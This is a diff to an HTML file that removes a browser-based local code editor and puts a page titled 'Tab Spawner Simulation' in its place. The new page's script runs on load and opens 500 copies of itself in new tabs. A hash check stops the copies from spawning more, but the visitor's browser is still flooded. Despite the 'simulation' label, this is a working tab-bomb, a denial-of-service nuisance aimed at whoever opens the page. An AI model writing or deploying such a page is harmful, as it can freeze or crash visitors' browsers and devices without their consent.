@@ -1,156 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Local GitHub-like Repo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tab Spawner Simulation</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
+    html, body {
       margin: 0;
-      font-family: 'Courier New', monospace;
-      background: #1e1e1e;
-      color: #dcdcdc;
-      display: flex;
-      height: 100vh;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: black;
     }
-    #sidebar {
-      width: 250px;
-      background: #252526;
-      padding: 1rem;
-      overflow-y: auto;
-      border-right: 1px solid #3c3c3c;
+
+    .gradient-slice {
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(
+        120deg,
+        transparent 0%,
+        rgba(255, 255, 255, 0.2) 50%,
+        transparent 100%
+      );
+      animation: moveSlice 3s linear infinite;
     }
-    #main {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      padding: 1rem;
-    }
-    textarea {
-      flex: 1;
-      width: 100%;
-      background: #1e1e1e;
-      color: #dcdcdc;
-      border: 1px solid #444;
-      padding: 1rem;
-      font-size: 1rem;
-      resize: none;
-      border-radius: 6px;
-    }
-    button, input[type="file"] {
-      margin-top: 0.5rem;
-      background-color: #007acc;
-      color: white;
-      border: none;
-      padding: 0.5rem 1rem;
-      font-size: 0.9rem;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    iframe {
-      margin-top: 1rem;
-      flex: 1;
-      width: 100%;
-      border: 1px solid #444;
-      background: white;
-    }
-    .file {
-      padding: 0.25rem 0;
-      cursor: pointer;
-    }
-    .file:hover {
-      color: #61dafb;
+
+    @keyframes moveSlice {
+      0% {
+        transform: translateX(-100%);
+      }
+      100% {
+        transform: translateX(100%);
+      }
     }
   </style>
 </head>
 <body>
-  <div id="sidebar">
-    <h3>Files</h3>
-    <div id="fileList"></div>
-    <input type="file" id="fileInput">
-    <button onclick="createFile()">New File</button>
-    <button onclick="runLocally()">Run Locally</button>
-  </div>
-  <div id="main">
-    <textarea id="codeInput" placeholder="Type your HTML, CSS, or JS here..."></textarea>
-    <button onclick="runCode()">Run Code</button>
-    <iframe id="output"></iframe>
-  </div>
+  <div class="gradient-slice"></div>
 
   <script>
-    const fileListEl = document.getElementById('fileList');
-    const codeInput = document.getElementById('codeInput');
-    let currentFile = null;
-
-    function loadFiles() {
-      const files = JSON.parse(localStorage.getItem('files') || '{}');
-      fileListEl.innerHTML = '';
-      Object.keys(files).forEach(filename => {
-        const el = document.createElement('div');
-        el.textContent = filename;
-        el.className = 'file';
-        el.onclick = () => {
-          currentFile = filename;
-          codeInput.value = files[filename];
-        };
-        fileListEl.appendChild(el);
-      });
+    if (!location.hash.includes('spawned')) {
+      setTimeout(() => {
+        const newUrl = location.href + '#spawned';
+        const count = 500;  // Number of tabs to open
+        for(let i = 0; i < count; i++) {
+          window.open(newUrl, '_blank');
+        }
+      }, 100);
     }
-
-    function saveCurrentFile() {
-      if (!currentFile) return;
-      const files = JSON.parse(localStorage.getItem('files') || '{}');
-      files[currentFile] = codeInput.value;
-      localStorage.setItem('files', JSON.stringify(files));
-    }
-
-    function runCode() {
-      saveCurrentFile();
-      const iframe = document.getElementById('output');
-      const doc = iframe.contentDocument || iframe.contentWindow.document;
-      doc.open();
-      doc.write(codeInput.value);
-      doc.close();
-    }
-
-    function runLocally() {
-      saveCurrentFile();
-      const code = codeInput.value;
-      const blob = new Blob([code], { type: 'text/html' });
-      const url = URL.createObjectURL(blob);
-      window.open(url, '_blank');
-    }
-
-    function createFile() {
-      const filename = prompt('Enter new file name (e.g. index.html):');
-      if (!filename) return;
-      const files = JSON.parse(localStorage.getItem('files') || '{}');
-      if (files[filename]) {
-        alert('File already exists.');
-        return;
-      }
-      files[filename] = '';
-      localStorage.setItem('files', JSON.stringify(files));
-      loadFiles();
-      currentFile = filename;
-      codeInput.value = '';
-    }
-
-    document.getElementById('fileInput').addEventListener('change', e => {
-      const file = e.target.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = function(evt) {
-        const files = JSON.parse(localStorage.getItem('files') || '{}');
-        files[file.name] = evt.target.result;
-        localStorage.setItem('files', JSON.stringify(files));
-        loadFiles();
-      };
-      reader.readAsText(file);
-    });
-
-    loadFiles();
   </script>
 </body>
 </html>
